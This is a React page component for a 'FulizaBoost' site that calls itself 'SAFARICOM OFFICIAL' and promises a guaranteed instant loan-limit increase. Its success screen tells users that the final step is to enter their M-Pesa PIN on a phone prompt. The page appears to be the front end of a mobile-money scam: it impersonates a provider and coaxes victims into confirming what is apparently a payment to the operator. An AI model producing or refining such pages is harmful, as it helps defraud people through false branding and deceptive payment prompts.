import { useNavigate, useLocation } from "react-router-dom";
import "../styles/Success.css";

const Success = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const selectedLimit = location.state || JSON.parse(sessionStorage.getItem("selectedLimit") || "{}");

  return (
    <main className="success-container">
      {/* HEADER */}
      <div className="badge">● SAFARICOM OFFICIAL</div>

      <h1 className="success-title">FulizaBoost</h1>
      <p className="subtitle">
        Instant Limit Increase • Guaranteed Approval
      </p>

      {/* SUCCESS ICON */}
      <div className="success-icon-wrapper">
        <div className="success-icon">✓</div>
      </div>

      {/* SUCCESS MESSAGE */}
      <h2 className="success-heading">Success!</h2>
      <p className="success-message">
        Your boost of <span className="amount-highlight">Ksh {selectedLimit.amount?.toLocaleString() || "30,000"}</span> has been successfully processed.
      </p>

      {/* INSTRUCTION BOX */}
      <div className="instruction-box">
        <div className="warning-icon">⚠️</div>
        <div className="instruction-text">
          <strong>Final Step:</strong> Enter your M-Pesa PIN on the prompt currently showing on your phone to activate your new limit.
        </div>
      </div>

      {/* RETURN BUTTON */}
      <button 
        className="return-btn"
        onClick={() => navigate("/")}
      >
        Return to Dashboard
      </button>
    </main>
  );
};

export default Success;